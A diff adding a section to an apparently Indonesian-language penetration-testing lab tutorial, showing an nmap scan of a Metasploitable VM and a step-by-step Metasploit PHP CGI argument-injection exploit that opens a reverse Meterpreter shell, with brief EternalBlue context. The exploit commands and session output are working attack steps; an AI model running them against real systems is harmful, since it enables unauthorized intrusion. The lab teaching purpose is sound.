@@ -2427,6 +2427,237 @@ meterpreter >
 
 Bangggg!!!! kita berhasil exploit java rmi tapi ada yang berbeda kali ini kita masuk kedalam session menggunakan `meterpreter`. Kelebihan `meterpreter` kita bisa menggunakan perintah tambahan, dan untuk menggunakan perintah tersebut kita bisa menggunakan perintah `help` untuk sebagai petunjuk.
 
+#### Exploit HTTP port 80
+
+Scan port 80 pada target
+
+```bash
+nmap -sV 192.168.1.22      
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 20:07 +08
+Nmap scan report for 192.168.1.22 (192.168.1.22)
+Host is up (0.012s latency).
+Not shown: 977 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login       OpenBSD or Solaris rlogind
+514/tcp  open  tcpwrapped
+1099/tcp open  java-rmi    GNU Classpath grmiregistry
+1524/tcp open  bindshell   Metasploitable root shell
+2049/tcp open  nfs         2-4 (RPC #100003)
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         UnrealIRCd
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+MAC Address: 08:00:27:27:B4:9C (Oracle VirtualBox virtual NIC)
+Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.82 seconds
+```
+
+Port 80 target terbuka selanjutnya masuk ke dalam metasploit, hal yang perlu dilakukan pertama menggunakan exploit untuk mengecek versi php kemudian menggunakan `search http_version` untuk mencari exploit, kemudian mencari exploit `php cgi` dengan perintah `search php_cgi`.
+
+```bash
+$ msfconsole
+
+Metasploit tip: Use the analyze command to suggest runnable modules for 
+hosts
+                                                  
+  +-------------------------------------------------------+
+  |  METASPLOIT by Rapid7                                 |
+  +---------------------------+---------------------------+
+  |      __________________   |                           |                                                                                                                                                      
+  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |                                                                                                                                                      
+  |             )=\           | |  EXPLOIT   \            |                                                                                                                                                      
+  |            // \\          | |_____________\_______    |                                                                                                                                                      
+  |           //   \\         | |==[msf >]============\   |                                                                                                                                                      
+  |          //     \\        | |______________________\  |                                                                                                                                                      
+  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |                                                                                                                                                      
+  |        //         \\      |  *********************    |                                                                                                                                                      
+  +---------------------------+---------------------------+                                                                                                                                                      
+  |      o O o                |        \'\/\/\/'/         |                                                                                                                                                      
+  |              o O          |         )======(          |                                                                                                                                                      
+  |                 o         |       .'  LOOT  '.        |                                                                                                                                                      
+  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |                                                                                                                                                      
+  | |    PAYLOAD     |""\___, |     /    (_||_     \      |                                                                                                                                                      
+  | |________________|__|)__| |    |     __||_)     |     |                                                                                                                                                      
+  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |                                                                                                                                                      
+  |  = = = = = = = = = = = =  |     '--------------'      |                                                                                                                                                      
+  +---------------------------+---------------------------+                                                                                                                                                      
+
+
+       =[ metasploit v6.4.38-dev                          ]
++ -- --=[ 2467 exploits - 1273 auxiliary - 431 post       ]
++ -- --=[ 1478 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search http_version
+
+Matching Modules
+================
+
+   #  Name                                 Disclosure Date  Rank    Check  Description
+   -  ----                                 ---------------  ----    -----  -----------
+   0  auxiliary/scanner/http/http_version  .                normal  No     HTTP Version Detection
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/http_version
+
+msf6 > use 0
+msf6 auxiliary(scanner/http/http_version) > show options
+
+Module options (auxiliary/scanner/http/http_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   THREADS  1                yes       The number of concurrent threads (max one per host)
+   VHOST                     no        HTTP server virtual host
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/http/http_version) > set rhosts 192.168.1.22
+rhosts => 192.168.1.22
+msf6 auxiliary(scanner/http/http_version) > show options
+
+Module options (auxiliary/scanner/http/http_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   192.168.1.22     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   THREADS  1                yes       The number of concurrent threads (max one per host)
+   VHOST                     no        HTTP server virtual host
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/http/http_version) > run
+
+[+] 192.168.1.22:80 Apache/2.2.8 (Ubuntu) DAV/2 ( Powered by PHP/5.2.4-2ubuntu5.10 )
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/http/http_version) > back
+msf6 > search php_cgi
+
+Matching Modules
+================
+
+   #  Name                                                          Disclosure Date  Rank       Check  Description
+   -  ----                                                          ---------------  ----       -----  -----------
+   0  exploit/multi/http/php_cgi_arg_injection                      2012-05-03       excellent  Yes    PHP CGI Argument Injection
+   1  exploit/windows/http/php_cgi_arg_injection_rce_cve_2024_4577  2024-06-06       excellent  Yes    PHP CGI Argument Injection Remote Code Execution
+   2    \_ target: Windows PHP                                      .                .          .      .
+   3    \_ target: Windows Command                                  .                .          .      .
+
+
+Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/http/php_cgi_arg_injection_rce_cve_2024_4577
+After interacting with a module you can manually set a TARGET with set TARGET 'Windows Command'
+
+msf6 > use 0
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit(multi/http/php_cgi_arg_injection) > show options
+
+Module options (exploit/multi/http/php_cgi_arg_injection):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   PLESK        false            yes       Exploit Plesk
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT        80               yes       The target port (TCP)
+   SSL          false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI                     no        The URI to request (must be a CGI-handled PHP script)
+   URIENCODING  0                yes       Level of URI URIENCODING and padding (0 for minimum)
+   VHOST                         no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.21     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/php_cgi_arg_injection) > set RHOSTS 192.168.1.22
+RHOSTS => 192.168.1.22
+msf6 exploit(multi/http/php_cgi_arg_injection) > show options
+
+Module options (exploit/multi/http/php_cgi_arg_injection):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   PLESK        false            yes       Exploit Plesk
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS       192.168.1.22     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT        80               yes       The target port (TCP)
+   SSL          false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI                     no        The URI to request (must be a CGI-handled PHP script)
+   URIENCODING  0                yes       Level of URI URIENCODING and padding (0 for minimum)
+   VHOST                         no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.21     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/php_cgi_arg_injection) > exploit
+
+[*] Started reverse TCP handler on 192.168.1.21:4444 
+[*] Sending stage (40004 bytes) to 192.168.1.22
+[*] Meterpreter session 1 opened (192.168.1.21:4444 -> 192.168.1.22:51943) at 2024-12-19 20:56:35 +0800
+
+meterpreter > 
+```
+
+Bang!!!!.
+
 #### Exploit Windows 7 dengan Eternalblue
 
 EternalBlue adalah perangkat lunak eksploitasi komputer yang dikembangkan oleh Badan Keamanan Nasional AS (NSA). Perangkat lunak ini didasarkan pada kerentanan di Microsoft Windows yang memungkinkan pengguna memperoleh akses ke sejumlah komputer yang terhubung ke suatu jaringan . NSA mengetahui tentang kerentanan ini tetapi tidak mengungkapkannya kepada Microsoft selama beberapa tahun, karena mereka berencana untuk menggunakannya sebagai mekanisme pertahanan terhadap serangan siber. Pada tahun 2017, NSA menemukan bahwa perangkat lunak tersebut dicuri oleh sekelompok peretas yang dikenal sebagai Shadow Brokers . Microsoft diberitahu tentang hal ini dan merilis pembaruan keamanan pada bulan Maret 2017 untuk menambal kerentanan tersebut. Sementara ini terjadi, kelompok peretas tersebut mencoba melelang perangkat lunak tersebut, tetapi tidak berhasil menemukan pembeli. EternalBlue kemudian dirilis ke publik pada tanggal 14 April 2017.
@@ -2992,3 +3223,5 @@ Meterpreter     : x86/windows
 ```
 
 Bangg!!! berhasil.
+
+>Baca Juga: [Meterpreter Basics Command](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)
